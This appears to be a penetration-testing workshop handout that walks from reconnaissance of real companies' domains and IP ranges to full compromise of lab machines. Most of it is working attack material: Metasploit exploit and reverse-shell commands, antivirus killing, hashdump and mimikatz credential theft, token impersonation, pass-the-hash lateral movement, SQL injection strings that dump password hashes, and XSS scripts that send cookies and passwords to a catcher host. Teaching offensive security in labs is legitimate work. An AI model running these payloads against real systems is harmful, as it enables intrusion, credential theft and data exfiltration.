Attacking a large company:


###############################
# InfoSec Program Development #
###############################
Download this file for program development walk-through:
https://s3.amazonaws.com/infosecaddictsfiles/Build-IT-Sec-Assessment-Capability.zip



#################
# Passive Recon #
#################

- Wikipedia Page
	- Are they Public or Private?
	- Does the target have any subsidiaries?

- Robtex
	- Show system map

- Netcraft 
	- http://toolbar.netcraft.com/site_report

- Passive Recon (Firefox Add-on)

- Example OSINT Report to review:
	- https://s3.amazonaws.com/infosecaddictsfiles/OSINT_Innophos_11242010.doc

###################################################
# Day 1: Identifying External Security Mechanisms #
###################################################

sudo /sbin/iptables -F
     strategicsec

cd /home/strategicsec/toolz



###########################
# Target IP Determination #
###########################

perl blindcrawl.pl -d motorola.com

-- Take each IP address and look ip up here:
http://www.networksolutions.com/whois/index.jsp


Zone Transfer fails on most domains, but here is an example of one that works:
dig axfr heartinternet.co.uk  @ns.heartinternet.co.uk


cd ~/toolz/
./ipcrawl 148.87.1.1 148.87.1.254				


sudo nmap -sL 148.87.1.0-255
     strategicsec


sudo nmap -sL 148.87.1.0-255 | grep oracle
     strategicsec





###########################
# Load Balancer Detection #
###########################

Here are some options to use for identifying load balancers:
	- http://toolbar.netcraft.com/site_report
	- https://addons.mozilla.org/en-US/firefox/addon/live-http-headers/


Here are some command-line options to use for identifying load balancers:

dig microsoft.com

cd ~/toolz
./lbd-0.1.sh microsoft.com


halberd microsoft.com
halberd motorola.com
halberd oracle.com



######################################
# Web Application Firewall Detection #
######################################

cd ~/toolz/wafw00f
python wafw00f.py http://www.oracle.com
python wafw00f.py http://www.strategicsec.com


cd ~/toolz/
sudo nmap -p 80 --script http-waf-detect.nse oracle.com
     strategicsec

sudo nmap -p 80 --script http-waf-detect.nse healthcare.gov
     strategicsec



########################
# Scanning Methodology #
########################

- Ping Sweep
What's alive?
------------
sudo nmap -sP 157.166.226.*
     strategicsec

	-if -SP yields no results try:
sudo nmap -sL 157.166.226.*
     strategicsec

	-Look for hostnames:
sudo nmap -sL 157.166.226.* | grep com
     strategicsec


- Port Scan
What's where?
------------
sudo nmap -sS 162.243.126.247
     strategicsec


- Bannergrab/Version Query
What versions of software are running
-------------------------------------
sudo nmap -sV 162.243.126.247
     strategicsec


- Vulnerability Research
Lookup the banner versions for public exploits
----------------------------------------------
http://exploit-db.com
http://securityfocus.com/bid
https://packetstormsecurity.com/files/tags/exploit/



#######################################################
# Day 1: 3rd Party Scanning, and scanning via proxies #
#######################################################

https://www.shodan.io/

	Create a FREE account and login

	net:129.188.8.0/24



cd /home/strategicsec/toolz/
perl proxyfinder-0.3.pl multiproxy 3 proxies.txt	<-- This takes a long time to run



sudo vi /etc/proxychains.conf				<--- Make sure that last line of the file is: socks4  127.0.0.1 9050
     strategicsec




----------------------------------------------------------------------
vi ~/toolz/fix-proxychains-dns.sh

#!/bin/bash
# This script is called by proxychains to resolve DNS names
# DNS server used to resolve names
# Reference: http://carnal0wnage.attackresearch.com/2013/09/changing-proxychains-hardcoded-dns.html
DNS_SERVER=4.2.2.2

if [ $# = 0 ] ; then
echo " usage:"
echo " proxyresolv <hostname> "
exit
fi

export LD_PRELOAD=libproxychains.so.3
dig $1 @$DNS_SERVER +tcp | awk '/A.+[0-9]+\.[0-9]+\.[0-9]/{print $5;}'
-----------------------------------------------------------------------


sudo ntpdate pool.ntp.org
     strategicsec

tor-resolve strategicsec.com

proxychains nmap -sT -p80 162.243.126.247

proxychains nmap -sT -PN -n -sV -p 21,22,23,25,80,110,139,443,445,1433,1521,3306,3389,8080,10000 162.243.126.247


If you want to block tor exit nodes you get a list from here:
http://rules.emergingthreats.net/blockrules/emerging-tor-BLOCK.rules

You probably should also block things like:
http://rules.emergingthreats.net/blockrules/emerging-rbn-BLOCK.rules			<----- Russian Business Network IPs
http://rules.emergingthreats.net/blockrules/emerging-botcc.rules			<----- BotNet Command and Control Servers
http://rules.emergingthreats.net/blockrules/emerging-rbn-malvertisers-BLOCK.rules	<----- Malware Advertisers

Here is where you can download the perl script to automatically update your firewall each day (create a cron job for it).
http://doc.emergingthreats.net/bin/view/Main/EmergingFirewallRules



#####################################
# Quick Stack Based Buffer Overflow #
#####################################
 
- You can download everything you need for this exercise (except netcat) from the link below
https://s3.amazonaws.com/infosecaddictsfiles/ExploitLab.zip
 
- Extract this zip file to your Desktop
 
- Go to folder C:\Users\Workshop\Desktop\ExploitLab\2-VulnServer, and run vulnserv.exe
 
- Open a new command prompt and type:
nc localhost 9999
 
- In the new command prompt window where you ran nc type:
HELP
 
- Go to folder C:\Users\Workshop\Desktop\ExploitLab\4-AttackScripts
- Right-click on 1-simplefuzzer.py and choose the option edit with notepad++
 
- Now double-click on 1-simplefuzzer.py
- You'll notice that vulnserv.exe crashes. Be sure to note what command and the number of As it crashed on.
 
 
- Restart vulnserv, and run 1-simplefuzzer.py again. Be sure to note what command and the number of As it crashed on.
 
- Now go to folder C:\Users\Workshop\Desktop\ExploitLab\3-OllyDBG and start OllyDBG. Choose 'File' -> 'Attach' and attach to process vulnserv.exe
 
- Go back to folder C:\Users\Workshop\Desktop\ExploitLab\4-AttackScripts and double-click on 1-simplefuzzer.py.
 
- Take note of the registers (EAX, ESP, EBP, EIP) that have been overwritten with As (41s).
 
- Now isolate the crash by restarting your debugger and running script 2-3000chars.py
 
- Calculate the distance to EIP by running script 3-3000chars.py
- This script sends 3000 nonrepeating chars to vulserv.exe and populates EIP with the value: 396F4338
 
4-count-chars-to-EIP.py
- In the previous script we see that EIP is overwritten with 396F4338 is 8 (38), C (43), o (6F), 9 (39)
- so we search for 8Co9 in the string of nonrepeating chars and count the distance to it
 
5-2006char-eip-check.py
- In this script we check to see if our math is correct in our calculation of the distance to EIP by overwriting EIP with 42424242
 
6-jmp-esp.py
- In this script we overwrite EIP with a JMP ESP (6250AF11) inside of essfunc.dll
 
7-first-exploit
- In this script we actually do the stack overflow and launch a bind shell on port 4444
 
8 - Take a look at the file vulnserv.rb and place it in your Ubuntu host via SCP or copy it and paste the code into the host.
 
 
------------------------------
 
cd /home/strategicsec/toolz/metasploit/modules/exploits/windows/misc
 
vi vulnserv.rb    (paste the code into this file)
 
 
 
cd ~/toolz/metasploit
 
./msfconsole
 
 
 
use exploit/windows/misc/vulnserv
set PAYLOAD windows/meterpreter/bind_tcp
set RHOST 192.168.88.129
set RPORT 9999
exploit



###########################
# Download the victim VMs #
###########################

- InfoSec Addicts Ubuntu Virtual Machine
https://s3.amazonaws.com/infosecaddictsvirtualmachines/InfoSecAddictsVM.zip
user: infosecaddicts
pass: infosecaddicts
 

- Windows 7 Virtual Machine
https://s3.amazonaws.com/infosecaddictsvirtualmachines/Win7x64.zip
user: workshop
pass: password
 

################
# Find/Replace #
################
StrategicSec-VM-IP	- Please replace StrategicSec-VM-IP with the IP address of your Strategic Security Ubuntu host

Win7-VM-IP		- Please replace Win7-VM-IP with the IP address of your Windows 7 victim host

 

########################################
# Boot up the StrategicSec Ubuntu host #
# You can also boot up the Win7 as well#
########################################
 
- Log in to your Ubuntu host with the following credentials:
        user: strategicsec
        pass: strategicsec
 
 
 
- I prefer to use Putty to SSH into my Ubuntu host on pentests and I'll be teaching this class in the same manner that I do pentests.
- You can download Putty from here:
- http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
 
 
- For the purpose of this workshop my Win7 VM IP address is: Win7-VM-IP so anytime you see that IP you'll know that's my Win7 VM
- StrategicSec-VM-IP is my Ubuntu IP address so anytime you see that IP you'll know that's my Ubuntu host
 
- Type the following commands
sudo /sbin/iptables -F
        strategicsec
 
cd ~/toolz/metasploit
 

#######################
# Attacking Windows 7 #
#######################


sudo /sbin/iptables -F
	strategicsec
 
cd ~/toolz/metasploit
 
./msfconsole
 
use exploit/windows/browser/ie_cgenericelement_uaf
 
set ExitOnSession false
 
set URIPATH /ie8
 
set PAYLOAD windows/meterpreter/reverse_tcp
 
set LHOST StrategicSec-VM-IP                                            
 
exploit -j
 
 
- Now from the Win7 host, use Internet Explorer 8 to connect to the exploit address (local address)
- given to you by metasploit.
 
- The address will be something like:
 
http://StrategicSec-VM-IP:8080/ie8                                            
 
 
 
- This will simulate a victim clicking on your malicious link and being exploited with a browser exploit.
 
 
###########################
# Client-Side Enumeration #
###########################
 
 
- You can list the active sessions by typing:
 
sessions -l
 
 
 
 
- You can "interact" with any active session by typing sessions -i 3 (replace 3 with the session number you want to interact with)
 
 
sessions -i 1
 
 
 
 
 
- You should now see Metasploit's meterpreter prompt.
 
 
********************************** Figure out who and where you are **********************************
 
meterpreter> sysinfo
 
 
meterpreter> getuid
 
 
meterpreter> ipconfig
 
 
meterpreter> run post/windows/gather/checkvm
 
 
meterpreter> run get_local_subnets
 
 
 
********************************** Escalate privileges and get hashes **********************************
 
 
meterpreter> use priv
 
 
--Option 1: GetSystem
meterpreter> getsystem
 
--Option 2:
meterpreter > run post/windows/escalate/getsystem
 
--Option 3:
meterpreter> background
back
use post/windows/escalate/droplnk
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST StrategicSec-VM-IP                                            
set LPORT 1234
exploit
 
--Option 4:
use exploit/windows/local/bypassuac
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST StrategicSec-VM-IP                                            
set LPORT 12345
exploit
 
--Option 5:
use exploit/windows/local/service_permissions
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST StrategicSec-VM-IP                                            
set LPORT 5555
exploit
 
--Option 6:
use exploit/windows/local/trusted_service_path
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST StrategicSec-VM-IP                                            
set LPORT 4567
exploit
 
 
--Option 7:
use exploit/windows/local/ppr_flatten_rec
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST StrategicSec-VM-IP                                            
set LPORT 7777
exploit
 
--Option 8:
use exploit/windows/local/ms_ndproxy
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST StrategicSec-VM-IP                                            
set LPORT 7788
exploit
 
 
--Option 9:
use exploit/windows/local/ask
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST StrategicSec-VM-IP                                            
set LPORT 7799
exploit
 
 
meterpreter > getuid
Server username: win7-64-victim\Workshop

meterpreter > getsystem
...got system (via technique 1).


meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
 
--------------------------------------------------------
 

meterpreter > ps                (search for a process running as NT AUTHORITY\SYSTEM)
 
meterpreter > migrate 2800      (your process id WILL NOT be 2800, but make sure you use one that is running at NT AUTHORITY\SYSTEM)
 
meterpreter> run killav
 
meterpreter> run post/windows/gather/hashdump

meterpreter> run post/windows/gather/credentials/credential_collector
 
 
********************************** Steal Tokens **********************************
 
meterpreter > getsystem
 
meterpreter > use incognito
 
meterpreter > list_tokens -u
 
meterpreter > list_tokens -g
 
meterpreter > impersonate_token                         <-- choose who you want to impersonate but be sure to use 2 slashes in the name (ex: impersonate_token domain\\user)
 
meterpreter> getuid
 
 
************ Stealing credentials and certificates ************
- NOTE: Most of the stuff after 'kerberos' DOES NOT work, but is given here so you know the correct syntax to use when connected to AD or dealing with smart/CAC cards.
 
meterpreter > getsystem
 
meterpreter > load mimikatz
 
meterpreter > kerberos
 
meterpreter > mimikatz_command -f sekurlsa::logonPasswords -a "full"
 
meterpreter > msv                                                               <-- Your AD password
 
meterpreter > livessp                                                           <-- Your Windows8 password
 
meterpreter > ssp                                                               <-- Your outlook password
 
meterpreter > tspkg                                                             <-- Your AD password
 
meterpreter > wdigest                                                           <-- Your AD password
 
meterpreter > mimikatz_command -f crypto::listStores
 
meterpreter > mimikatz_command -f crypto::listCertificates
 
meterpreter > mimikatz_command -f crypto::exportCertificates CERT_SYSTEM_STORE_CURRENT_USER
 
meterpreter > mimikatz_command -f crypto::patchcapi
 
meterpreter> search -d <directory> -f <file-pattern>
 
 
********************************** Enumerate the host you are on **********************************
 
meterpreter > run getcountermeasure
 
meterpreter> run winenum
 
meterpreter > run post/windows/gather/enum_applications
 
meterpreter > run post/windows/gather/enum_logged_on_users
 
meterpreter > run post/windows/gather/usb_history
 
meterpreter > run post/windows/gather/enum_shares
 
meterpreter > run post/windows/gather/enum_snmp
 
meterpreter> reg enumkey -k HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
 
 
********************************** FIX PSEXEC **********************************
 
- We use the shell command to get to the Victim Dos command so we can add a registry field.
 
meterpreter > execute -c -H -f cmd -a "/k" -i
reg /?
 
 
- Created a registry field to the Victim computer, this will allow us to access the machine using and exploit via PSEXEC.
 
C:\Windows\system32> reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system  /v LocalAccountTokenFilterPolicy  /t REG_DWORD  /d  1


c:\Windows\system32> netsh advfirewall set allprofiles state off

********************************** Lateral Movement *******************************


Now we can run the PSEXEC exploit.
-- Option 1:
use exploit/windows/smb/psexec

set SMBUser Workshop
 
set SMBPass password
 
set RHOST Win7-VM-IP

set payload windows/meterpreter/reverse_tcp
 
set LHOST StrategicSec-VM-IP
 
set LPORT 2345
 
exploit
 
 
 
 
-- Option 2:
use exploit/windows/smb/psexec
 
set SMBUser Workshop
 
set SMBPass aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
 
set payload windows/meterpreter/reverse_tcp
 
set RHOST Win7-VM-IP                      
 
set LHOST StrategicSec-VM-IP
 
set LPORT 5678
 
exploit



##################################
# Basic: Web Application Testing #
##################################
 
Most people are going to tell you reference the OWASP Testing guide.
https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents
 
I'm not a fan of it for the purpose of actual testing. It's good for defining the scope of an assessment, and defining attacks, but not very good for actually attacking a website.
 
 
The key to doing a Web App Assessment is to ask yourself the 3 web questions on every page in the site.
   
    1. Does the website talk to a DB?
        - Look for parameter passing (ex: site.com/page.php?id=4)
        - If yes - try SQL Injection
 
    2. Can I or someone else see what I type?
        - If yes - try XSS
 
    3. Does the page reference a file?
        - If yes - try LFI/RFI
 
Let's start with some manual testing against 45.77.162.239
 
 
Start here:
http://45.77.162.239/
 
 
There's no parameter passing on the home page so the answer to question 1 is NO.
There is however a search box in the top right of the webpage, so the answer to question 2 is YES.
 
Try an XSS in the search box on the home page:
<script>alert(123);</script>
 
Doing this gives us the following in the address bar:
http://45.77.162.239/BasicSearch.aspx?Word=<script>alert(123);</script>
 
Ok, so we've verified that there is XSS in the search box.
 
Let's move on to the search box in the left of the page.
 
Let's give the newsletter signup box a shot
 
Moving on to the login page.
http://45.77.162.239/login.aspx
 
I entered a single quote (') for both the user name and the password. I got the following error:
 
Let's try throwing a single quote (') in there:
 
http://45.77.162.239/bookdetail.aspx?id=2'
 
 
I get the following error:
 
Unclosed quotation mark after the character string ''.
Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code.
 
Exception Details: System.Data.SqlClient.SqlException: Unclosed quotation mark after the character string ''.
 
 
 
 
 
 
 
 
 
 
#########################################################################################
# SQL Injection                                                                         #
# https://s3.amazonaws.com/infosecaddictsfiles/1-Intro_To_SQL_Intection.pptx            #
#########################################################################################
 
 
- Another quick way to test for SQLI is to remove the paramter value
 
 
#############################
# Error-Based SQL Injection #
#############################
http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(0))--
http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(1))--
http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(2))--
http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(3))--
http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(4))--
http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(N))--     NOTE: "N" - just means to keep going until you run out of databases
http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85))--
http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85) and name>'bookmaster')--
http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85) and name>'sysdiagrams')--
 
 
 
 
#############################
# Union-Based SQL Injection #
#############################
http://45.77.162.239/bookdetail.aspx?id=2 order by 100--
http://45.77.162.239/bookdetail.aspx?id=2 order by 50--
http://45.77.162.239/bookdetail.aspx?id=2 order by 25--
http://45.77.162.239/bookdetail.aspx?id=2 order by 10--
http://45.77.162.239/bookdetail.aspx?id=2 order by 5--
http://45.77.162.239/bookdetail.aspx?id=2 order by 6--
http://45.77.162.239/bookdetail.aspx?id=2 order by 7--
http://45.77.162.239/bookdetail.aspx?id=2 order by 8--
http://45.77.162.239/bookdetail.aspx?id=2 order by 9--
http://45.77.162.239/bookdetail.aspx?id=2 union all select 1,2,3,4,5,6,7,8,9--
 
    We are using a union select statement because we are joining the developer's query with one of our own.
    Reference:
    http://www.techonthenet.com/sql/union.php
    The SQL UNION operator is used to combine the result sets of 2 or more SELECT statements.
    It removes duplicate rows between the various SELECT statements.
 
    Each SELECT statement within the UNION must have the same number of fields in the result sets with similar data types.
 
http://45.77.162.239/bookdetail.aspx?id=-2 union all select 1,2,3,4,5,6,7,8,9--
 
    Negating the paramter value (changing the id=2 to id=-2) will force the pages that will echo back data to be displayed.
 
http://45.77.162.239/bookdetail.aspx?id=-2 union all select 1,user,@@version,4,5,6,7,8,9--
http://45.77.162.239/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,7,8,9--
http://45.77.162.239/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,db_name(0),8,9--
http://45.77.162.239/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,master.sys.fn_varbintohexstr(password_hash),8,9 from master.sys.sql_logins--
 
 
 
 
 
- Another way is to see if you can get the backend to perform an arithmetic function
http://45.77.162.239/bookdetail.aspx?id=(2)
http://45.77.162.239/bookdetail.aspx?id=(4-2)  
http://45.77.162.239/bookdetail.aspx?id=(4-1)
 
 
 
http://45.77.162.239/bookdetail.aspx?id=2 or 1=1--
http://45.77.162.239/bookdetail.aspx?id=2 or 1=2--
http://45.77.162.239/bookdetail.aspx?id=1*1
http://45.77.162.239/bookdetail.aspx?id=2 or 1 >-1#
http://45.77.162.239/bookdetail.aspx?id=2 or 1<99#
http://45.77.162.239/bookdetail.aspx?id=2 or 1<>1#
http://45.77.162.239/bookdetail.aspx?id=2 or 2 != 3--
http://45.77.162.239/bookdetail.aspx?id=2 &0#
 
 

http://45.77.162.239/bookdetail.aspx?id=2 and 1=1--
http://45.77.162.239/bookdetail.aspx?id=2 and 1=2--
http://45.77.162.239/bookdetail.aspx?id=2 and user='joe' and 1=1--
http://45.77.162.239/bookdetail.aspx?id=2 and user='dbo' and 1=1--
 
 
 
###############################
# Blind SQL Injection Testing #
###############################
Time-Based BLIND SQL INJECTION - EXTRACT DATABASE USER
     
3 - Total Characters
http://45.77.162.239/bookdetail.aspx?id=2; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'--
http://45.77.162.239/bookdetail.aspx?id=2; IF (LEN(USER)=2) WAITFOR DELAY '00:00:10'--
http://45.77.162.239/bookdetail.aspx?id=2; IF (LEN(USER)=3) WAITFOR DELAY '00:00:10'--      (Ok, the username is 3 chars long - it waited 10 seconds)
 
Let's go for a quick check to see if it's DBO
http://45.77.162.239/bookdetail.aspx?id=2; IF ((USER)='dbo') WAITFOR DELAY '00:00:10'--
 
Yup, it waited 10 seconds so we know the username is 'dbo' - let's give you the syntax to verify it just for fun.
 
D  - 1st Character
http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=97) WAITFOR DELAY '00:00:10'--  
http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=98) WAITFOR DELAY '00:00:10'--
http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=99) WAITFOR DELAY '00:00:10'--
http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=100) WAITFOR DELAY '00:00:10'--  (Ok, first letter is a 100 which is the letter 'd' - it waited 10 seconds)
 
B - 2nd Character
http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),2,1)))>97) WAITFOR DELAY '00:00:10'--   Ok, good it waited for 10 seconds
http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),2,1)))=98) WAITFOR DELAY '00:00:10'--   Ok, good it waited for 10 seconds
 
O - 3rd Character
http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>97) WAITFOR DELAY '00:00:10'--   Ok, good it waited for 10 seconds
http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>115) WAITFOR DELAY '00:00:10'--
http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>105) WAITFOR DELAY '00:00:10'--      Ok, good it waited for 10 seconds
http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>110) WAITFOR DELAY '00:00:10'--      Ok, good it waited for 10 seconds
http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))=109) WAITFOR DELAY '00:00:10'--
http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))=110) WAITFOR DELAY '00:00:10'--      
http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))=111) WAITFOR DELAY '00:00:10'--      Ok, good it waited for 10 seconds
 
 
 
 
 
##########
# Sqlmap #
##########
If you want to see how we automate all of the SQL Injection attacks you can log into your StrategicSec-Ubuntu-VM and run the following commands:

cd /home/strategicsec/toolz/sqlmap-dev/
python sqlmap.py -u "http://45.77.162.239/bookdetail.aspx?id=2" -b
python sqlmap.py -u "http://45.77.162.239/bookdetail.aspx?id=2" --current-user
python sqlmap.py -u "http://45.77.162.239/bookdetail.aspx?id=2" --current-db 
python sqlmap.py -u "http://45.77.162.239/bookdetail.aspx?id=2" --dbs 
python sqlmap.py -u "http://45.77.162.239/bookdetail.aspx?id=2" -D BookApp --tables 
python sqlmap.py -u "http://45.77.162.239/bookdetail.aspx?id=2" -D BookApp -T BOOKMASTER --columns 
python sqlmap.py -u "http://45.77.162.239/bookdetail.aspx?id=2" -D BookApp -T sysdiagrams --columns 
python sqlmap.py -u "http://45.77.162.239/bookdetail.aspx?id=2" -D BookApp -T BOOKMASTER --columns --dump 
python sqlmap.py -u "http://45.77.162.239/bookdetail.aspx?id=2" -D BookApp -T sysdiagrams --columns --dump 
python sqlmap.py -u "http://45.77.162.239/bookdetail.aspx?id=2" --users --passwords 
 
#######################
# Attacking PHP/MySQL #
#######################
 
Go to LAMP Target homepage
http://45.63.104.73/
 
 
 
Clicking on the Acer Link:
http://45.63.104.73/acre2.php?lap=acer
 
    - Found parameter passing (answer yes to question 1)
    - Insert ' to test for SQLI
 
http://45.63.104.73/acre2.php?lap=acer'
 
 
Page returns the following error:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''acer''' at line 1
 
 
 
In order to perform union-based sql injection - we must first determine the number of columns in this query.
We do this using the ORDER BY
http://45.63.104.73/acre2.php?lap=acer' order by 100-- +
 
Page returns the following error:
Unknown column '100' in 'order clause'
 
 
 
http://45.63.104.73/acre2.php?lap=acer' order by 50-- +
 
Page returns the following error:
Unknown column '50' in 'order clause'
 
 
 
http://45.63.104.73/acre2.php?lap=acer' order by 25-- +
Page returns the following error:
Unknown column '25' in 'order clause'
 
 
 
http://45.63.104.73/acre2.php?lap=acer' order by 12-- +
 
Page returns the following error:
Unknown column '12' in 'order clause'
 
 
 
http://45.63.104.73/acre2.php?lap=acer' order by 6-- +
---Valid page returned for 5 and 6...error on 7 so we know there are 6 columns
 
 
 
Now we build out the union all select statement with the correct number of columns
 
Reference:
http://www.techonthenet.com/sql/union.php
 
 
 
http://45.63.104.73/acre2.php?lap=acer' union all select 1,2,3,4,5,6-- +
 
 
 
Now we negate the parameter value 'acer' by turning into the word 'null':
http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,4,5,6-- j
 
We see that a 4 and a 5 are on the screen. These are the columns that will echo back data
 
 
Use a cheat sheet for syntax:
http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
 
 
http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user(),5,6-- j
 
http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user(),version(),6-- j
 
http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user(),@@version,6-- +
 
http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user(),@@datadir,6-- +
 
 
http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user,password,6 from mysql.user -- a
 
 


Sometimes students ask about the "-- j" or "-- +" that I append to SQL injection attack string.

Here is a good reference for it:
https://www.symantec.com/connect/blogs/mysql-injection-comments-comments

Both attackers and penetration testers alike often forget that MySQL comments deviate from the standard ANSI SQL specification. The double-dash comment syntax was first supported in MySQL 3.23.3. However, in MySQL a double-dash comment "requires the second dash to be followed by at least one whitespace or control character (such as a space, tab, newline, and so on)." This double-dash comment syntax deviation is intended to prevent complications that might arise from the subtraction of negative numbers within SQL queries. Therefore, the classic SQL injection exploit string will not work against backend MySQL databases because the double-dash will be immediately followed by a terminating single quote appended by the web application. However, in most cases a trailing space needs to be appended to the classic SQL exploit string. For the sake of clarity we'll append a trailing space and either a "+" or a letter.


###############################################################################
# What is XSS                                                                 #
# https://s3.amazonaws.com/infosecaddictsfiles/2-Intro_To_XSS.pptx            #
###############################################################################
 
OK - what is Cross Site Scripting (XSS)
 
1. Use Firefox to browse to the following location:
 
    http://45.63.104.73/xss_practice/
 
    A really simple search page that is vulnerable should come up.
 
 
 
 
2. In the search box type:
   
    <script>alert('So this is XSS')</script>
 
 
    This should pop-up an alert window with your message in it proving XSS is in fact possible.
    Ok, click OK and then click back and go back to http://45.63.104.73/xss_practice/
 
 
3. In the search box type:
   
    <script>alert(document.cookie)</script>
 
 
    This should pop-up an alert window with your message in it proving XSS is in fact possible and your cookie can be accessed.
    Ok, click OK and then click back and go back to http://45.63.104.73/xss_practice/
 
4. Now replace that alert script with:
 
    <script>document.location="http://45.63.104.73/xss_practice/cookie_catcher.php?c="+document.cookie</script>
 
 
This will actually pass your cookie to the cookie catcher that we have sitting on the webserver.
 
 
5. Now view the stolen cookie at:
    http://45.63.104.73/xss_practice/cookie_stealer_logs.html
 
 
The cookie catcher writes to this file and all we have to do is make sure that it has permissions to be written to.
 
 
 
 
 
 
############################
# A Better Way To Demo XSS #
############################
 
 
Let's take this to the next level. We can modify this attack to include some username/password collection. Paste all of this into the search box.
 
 
Use Firefox to browse to the following location:
 
    http://45.63.104.73/xss_practice/
 
 
 
Paste this in the search box
----------------------------
 
 
Option 1
--------
 
<script>
password=prompt('Your session is expired. Please enter your password to continue',' ');
document.write("<img src=\"http://45.63.104.73/xss_practice/passwordgrabber.php?password=" +password+"\">");
</script>
 
 
Now view the stolen cookie at:
    http://45.63.104.73/xss_practice/passwords.html
 
 
 
Option 2
--------
<script>
username=prompt('Please enter your username',' ');
password=prompt('Please enter your password',' ');
document.write("<img src=\"http://45.63.104.73/xss_practice/unpw_catcher.php?username="+username+"&password="+password+"\">");
</script>
 
 
 
 
Now view the stolen cookie at:
http://45.63.104.73/xss_practice/username_password_logs.html
 
 
 
 
#########################################
# Let's try a local file include (LFI)  #
#########################################
- Here is an example of an LFI
- Open this page in Firefox:
http://45.63.104.73/showfile.php?filename=contactus.txt
 
- Notice the page name (showfile.php) and the parameter name (filename) and the filename (contactus.txt)
- Here you see a direct reference to a file on the local filesystem of the victim machine.
- You can attack this by doing the following:
http://45.63.104.73/showfile.php?filename=/etc/passwd
 
- This is an example of a Local File Include (LFI), to change this attack into a Remote File Include (RFI) you need some content from
- somewhere else on the Internet. Here is an example of a text file on the web:
http://www.opensource.apple.com/source/SpamAssassin/SpamAssassin-127.2/SpamAssassin/t/data/etc/hello.txt
 
- Now we can attack the target via RFI like this:
http://45.63.104.73/showfile.php?filename=http://www.opensource.apple.com/source/SpamAssassin/SpamAssassin-127.2/SpamAssassin/t/data/etc/hello.txt
 
 
 
 
###############################
# How much fuzzing is enough? #
###############################
There really is no exact science for determining the correct amount of fuzzing per parameter to do before moving on to something else.
 
Here are the steps that I follow when I'm testing (my mental decision tree) to figure out how much fuzzing to do.
 
 
Step 1: Ask yourself the 3 questions per page of the site.
 
Step 2: If the answer is yes, then go down that particular attack path with a few fuzz strings (I usually do 10-20 fuzz strings per parameter)
 
Step 3: When you load your fuzz strings - use the following decision tree
 
    - Are the fuzz strings causing a default error message (example 404)?
        - If this is the case then it is most likely NOT vulnerable
 
    - Are the fuzz strings causing a WAF or LB custom error message?
        - If this is the case then you need to find an encoding method to bypass
 
 
    - Are the fuzz strings causing an error message that discloses the backend type?
        - If yes, then identify DB type and find correct syntax to successfully exploit
        - Some example strings that I use are:
            '
            "
            ()          <----- Take the parameter value and put it in parenthesis
            (5-1)       <----- See if you can perform an arithmetic function
 
 
    - Are the fuzz strings rendering executable code?
        - If yes, then report XSS/CSRF/Response Splitting/Request Smuggling/etc
        - Some example strings that I use are:
            <b>hello</b>
            <u>hello</u>
            <script>alert(123);</script>
            <script>alert(xss);</script>
            <script>alert('xss');</script>
            <script>alert("xss");</script>
 
 


#############################
# Understanding Snort rules #
#############################
Field 1: Action - Snort can process events in 1 of 3 ways (alert, log, drop)

